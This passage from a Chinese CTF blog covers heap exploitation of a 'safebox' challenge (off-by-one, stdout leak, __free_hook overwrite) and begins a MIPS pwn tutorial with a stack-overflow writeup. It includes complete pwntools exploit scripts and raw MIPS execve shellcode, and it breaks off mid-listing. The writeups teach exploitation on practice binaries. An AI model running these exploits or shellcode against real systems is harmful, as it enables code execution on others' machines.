io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>fake_file按照条件进行构造，这只是修改了stdout结构体，我们还需要触发<code>_IO_flush_all_lockp</code>，前面说过，要触发<code>_IO_flush_all_lockp</code>除了libc执行abort函数时，当程序执行exit时也会触发(跟进exit函数调试会发现exit函数调用了<code>_IO_flush_all_lockp</code>)。题目中，当我们输入的size大于0xf0时就会执行exit函数，于是我们将输入size为256就可以getshell，由于stdout结构体已经被我们修改，我们看不到程序的回显，但程序依然是可以执行的。</p>
<p>对比2.23和2.24下的利用手法，可以看到2.24下的利用方式更加简便</p>
<p>除了利用IO_FILE来getshell，当程序没有输出函数时，我们也可以利用<code>_IO_2_1_stdout_</code>结构体来泄露libc地址，具体原理可以看ex师傅的<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">利用 <em>IO_2_1_stdout</em> 泄露信息</a>，写的很详细</p>
<h3 id="0x3-safebox"><a href="#0x3-safebox" class="headerlink" title="0x3.safebox"></a>0x3.safebox</h3><p>保护全开，libc2.27</p>
<p>有两个功能，add和delete</p>
<p>其中add功能存在off-by-one，很明显</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_B2C</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>
  <span class="token keyword">unsigned</span> __int64 size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">sub_A84</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"len:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  size <span class="token operator">=</span> <span class="token function">sub_A84</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">></span> <span class="token number">0xFFF</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  qword_202040<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  qword_2020C0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> qword_2020C0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">,</span> qword_202040<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>delete函数没问题，free且指针清零</p>
<p>那么利用方式就是off-by-one构造出overlap，然后在tcache上踩出main_arena的地址，修改后四位为stdout结构体的后四位，1/16的几率能分配过去，然后用来修改stdout的payload为<code>p64(0xfbad1887)+p64(0)*3+p8(0)</code>,就能够泄露出libc地址。有了地址之后，再来一次overlap，将tcache的fd修改为freehook，申请到freehook并修改为system，完整exp如下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'safebox'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'len:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
    dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#off-by-one，修改chunk1的size为chunk1+chunk2+chunk3</span>
    dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将chunk2放入tcache</span>
    dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将chunk1放入unsorted bin</span>
    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#申请回chunk1，使main_arena落入chunk2的fd</span>
    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> p16<span class="token punctuation">(</span><span class="token number">0x7760</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#这里我们需要申请大于或者小于chunk2的chunk，否则便会从tcache中取chunk，fd便会失效；将fd的后四位修改为_IO_2_1_stdout_地址的后四位</span>
    add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#修改_IO_2_1_stdout_</span>
    add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ed8b0</span>
    <span class="token keyword">if</span> libc_base <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">0x3ed8b0</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将剩下的unsorted bin申请出来</span>
    add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
    dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#继续off-by-one</span>
    dele<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>
    dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># gdb.attach(io)</span>

    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> io
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./safebox'</span><span class="token punctuation">)</span>
            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></div></div><a class="button-hover more" href="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/">MIPS PWN学习</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2020-08-05</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/MIPS/">MIPS</a></div></div><div class="post-content"><div class="main-content content"><p>​        MIPS架构常用于路由器设备，而路由器固件漏洞大部分都是栈溢出，因此，掌握MIPS架构下的漏洞利用对于挖掘利用路由器漏洞也是很重要的一项技能。</p>
<p>准备环境及工具：</p>
<ul>
<li><strong>Ubuntu16</strong>虚拟机(Ubuntu14或者Ubuntu18也可以，不过推荐使用Ubuntu16，我用18装环境遇到了很多奇奇怪怪的问题)</li>
<li><strong>buildroot</strong>交叉编译环境，由于<strong>buildroot</strong>只能编译大端序或者小端序一种架构的环境，这里推荐安装<strong>gcc-mipsel-linux-gnu</strong>和<strong>gcc-mips-linux-gnu</strong>，直接apt安装就可以，使用方法和gcc一样</li>
<li><strong>gdb-multiarch</strong>，提供多架构的调试，直接apt安装，再装一个<strong>pwndbg</strong>或者<strong>peda</strong>或者<strong>gef</strong>插件使用更方便，使用方法：<strong>qemu-mips/qemu-mipsel -L lib/ -g 1234(端口号) ./bin</strong> ,然后<strong>gdb-multiarch ./bin</strong>加载程序，gdb会自动识别程序架构，然后用<strong>target remote:127.0.0.1:1234</strong>来连接qemu进行调试即可。当然，用IDA连接也是可以，<strong>Debugger-&gt;Remote GDB Debugger</strong>然后填上ip端口号和文件路径就行了</li>
<li>IDA插件，<strong>mipsrop</strong>，开源在GitHub上，由于mips指令和x86指令存在差别，mips指令没有类似于push、pop这种直接使数据入栈出栈的指令，只有<strong>lw(load word)</strong>，<strong>sw(save word)</strong>之类的指令来进行数据的转移，于是我们要在栈上进行操作就有很多种方式，用<strong>ROPgadget</strong>来搜索会很麻烦，而<strong>mipsrop</strong>会将<strong>gadgets</strong>进行分类以及不同的<strong>gadget</strong>使用后导致的结果显示出来，使用起来要方便的多。</li>
<li><strong>Ghidra</strong>，将mips汇编反编译为c伪代码，<strong>jeb</strong>也有mips反编译功能，不过对比了一下觉得<strong>Ghidra</strong>的效果更好(IDA7.5也新增了mips反编译功能，不过……贫穷使我望而却步)</li>
</ul>
<p>​       简单说一下mips架构的寄存器及作用。mips32一共有32个通用寄存器，用<strong>$0-$31</strong>表示。<strong>$4-$7</strong>寄存器用作函数传参，记为<strong>$a0-$a3(argument)</strong>,超出四个参数的用栈传参;<strong>$28</strong>寄存器记为<strong>$gp(global pointer)</strong>,这是一个全局指针，各种函数调用之类都靠$gp寻址;<strong>$29</strong>记为<strong>$sp(stack pointer)</strong>,作用和x86架构的sp寄存器一样，指向栈顶;<strong>$30</strong>记为<strong>$fp(fram pointer)</strong>,或者记为<strong>$s8</strong>，这个寄存器类似于x86架构的ebp指针，指向栈底;<strong>$31</strong>记为<strong>$ra(return address)</strong>，类似于x86架构的eip寄存器，保存返回地址，我们的攻击目标就是劫持$ra寄存器。我们进行利用常用的就这些寄存器。</p>
<p>接下来上题</p>
<h2 id="0x1-rootme-ELF-MIPS-Stack-buffer-overflow-No-NX"><a href="#0x1-rootme-ELF-MIPS-Stack-buffer-overflow-No-NX" class="headerlink" title="0x1.rootme-ELF MIPS - Stack buffer overflow - No NX"></a>0x1.rootme-ELF MIPS - Stack buffer overflow - No NX</h2><p>题目只给我们mips的汇编代码，所以我们需要由汇编编译出可执行文件</p>
<pre class=" language-assembly"><code class="language-assembly">.set    nomips16
    .global __start
    .text

__start:
    la      $t9, function
    jalr    $t9
    nop
    addiu   $v0, $zero, 4000 + 1
    move    $a0, $zero
    syscall
function:
    subu    $sp, $sp, 0x18
    sw      $ra, 0x14($sp)

    # write
    addiu   $v0, $zero, 4000 + 4
    la    $a0, 1
    la    $a1, hello
    la    $a2, hello_len
    syscall

    # read
    addiu   $v0, $zero, 4000 + 3
    move    $a0, $zero
    move    $a1, $sp
    addiu   $a2, $zero, 0x80
    syscall

    # write
    addiu   $v0, $zero, 4000 + 4
    la      $a0, 1
    la      $a1, hello_start
    la      $a2, hello_start_len
    syscall

    # write
    addiu   $v0, $zero, 4000 + 4
    la      $a0, 1
    move    $a1, $sp
    la      $a2, 20
    syscall

    lw      $ra, 0x14($sp)
    addiu   $sp, 0x18
    jr      $ra
    nop

.data

hello:  .asciz  "Hello World\nWhat is your name: "
    hello_len =    . - hello
hello_start:  .asciz  "Hello "
    hello_start_len =    . - hello_start</code></pre>
<p>题目给的保护如下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/1.jpg" alt=""></p>
<p>由于题目说的是MIPS，所以我们就按照大端序来编译</p>
<p>用如下命令进行编译</p>
<pre><code>mips-linux-gnu-as of.s -o of.o #编译成二进制目标文件
mips-linux-gnu-ld of.o -o of #编译生成可执行文件</code></pre><p>然后我们运行一下，由于是静态编译，所以直接./of即可</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/2.jpg" alt=""></p>
<p>从汇编我们可以看到</p>
<pre class=" language-assembly"><code class="language-assembly">subu    $sp, $sp, 0x18
sw      $ra, 0x14($sp)</code></pre>
<p>函数开头只将栈顶抬高了0x18个字节，并将返回地址存入sp+0x14的位置，而后面的read功能读入0x80个字节</p>
<pre class=" language-assembly"><code class="language-assembly"># read
addiu   $v0, $zero, 4000 + 3 #$v0保存系统调用号，read系统调用号为4003
move    $a0, $zero #$a0保存第一个参数，0
move    $a1, $sp #$a1保存第二个参数，栈顶指针
addiu   $a2, $zero, 0x80 #$a2保存第三个参数，0x80</code></pre>
<p>存在很明显的栈溢出，而由于程序是由简短的汇编代码生成，所以基本上不存在可用的gadget，而由于远程没有开启<strong>ASLR</strong>，所以栈地址也不会发生变化，且程序没有<strong>NX</strong>保护，所以我们使用shellcode来进行利用</p>
<p>由汇编代码我们可以知道offset为0x14，我们填充0x14个垃圾字符，然后将返回值覆盖为<strong>$sp+0x14+4</strong>，即存储返回地址的位置的后四字节，然后将$sp+0x14+4的值填充为shellcode，这样返回到$ra之后就会执行shellcode</p>
<p>关闭本机上的aslr后动态调试，可以得到stack的地址</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/3.jpg" alt=""></p>
<p>不过在按照这个栈地址打不通，于是我动调了一下exp，发现此时的栈地址后三位为148，调试程序和调试exp时的栈地址相差0x10的大小</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/4.jpg" alt=""></p>
<p>修改之后便能打通了,最终exp如下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'mips'</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'big'</span>
<span class="token comment" spellcheck="true"># io=process(['qemu-mips','-g','1235','./of'])</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./of'</span><span class="token punctuation">)</span>
stack <span class="token operator">=</span> <span class="token number">0x76fff148</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x14</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> <span class="token string">"\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span>
payload <span class="token operator">+=</span> shellcode
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What is your name: '</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/5.jpg" alt=""></p>
<p>(但不知道为什么远程就是打不通。。。)</p>
<h2 id="0x2-rootme-ELF-MIPS-Basic-ROP"><a href="#0x2-rootme-ELF-MIPS-Basic-ROP" class="headerlink" title="0x2.rootme-ELF MIPS - Basic ROP"></a>0x2.rootme-ELF MIPS - Basic ROP</h2><p>程序保护如下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/6.jpg" alt=""></p>
<p>连接ssh下载文件</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/7.jpg" alt="">)(rootme的ssh连上去还挺好康的)</p>
<p>虽然题目已经告诉了保护情况，但拿到题目我还是习惯先checksec一下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/8.jpg" alt=""></p>
<p>32位大端序程序，而且之前ssh连上去之后就直接告诉我们了程序是动态编译的</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/9.jpg" alt=""></p>
<p>于是我们顺便把lib文件夹下载下来(由于ssh服务器在外网，所以我这里下载的挺慢的。。。)，文件夹中有两个文件，ld.so.1和libc.so.6</p>
<p>但运行起来却出了意想不到的情况</p>
<p>一般来说应该直接<strong>qemu-mips -L  ./  ./ch64</strong>就能运行起来，但这题却给我报了这么个错</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/10.jpg" alt=""></p>
<p>然而在ssh服务器上使用这条命令却能直接运行</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/11.jpg" alt=""></p>
<p>有点懵逼，遂谷歌报错信息，但并没有获得有用的信息，查看了一下ssh服务器上的qemu版本，为2.11.1，猜测是不是qemu版本不对，就下载了2.11.1，然而并没有什么🥚用，陷入沉思。之后又谷歌了一下，看到有类似报错的，直接使用-g进行调试，于是使用<strong>qemu-mips -L  ./ -g 1234 ./ch64</strong>启动调试，vmmap查看发现程序并未加载libc.6.so库,仅仅只加载了ld.so.1，于是便使用pwn题下加载不同libc的方法强制加载libc.so.6库</p>
<pre class=" language-shell"><code class="language-shell">export LD_LIBRARY_PATH=`pwd`
export LD_PRELOAD=lib/libc.so.6</code></pre>
<p>然后运行</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/12.jpg" alt=""></p>
<p>成功！第一行的报错个人猜测是我强制加载了libc库，然后-L 又指定了一下libc，然后报错，当然这只是猜测，也懒得谷歌了</p>
<p>接下来就开始利用</p>
<p>首先将程序分别用IDA和Ghidra进行加载，用ghidra查看伪代码,main函数如下</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  byte bStack144<span class="token punctuation">;</span>
  <span class="token keyword">char</span> acStack136 <span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  bStack144 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_stdout<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>bStack144 <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>bStack144 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nAccess denied.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Subroutine does not return */</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
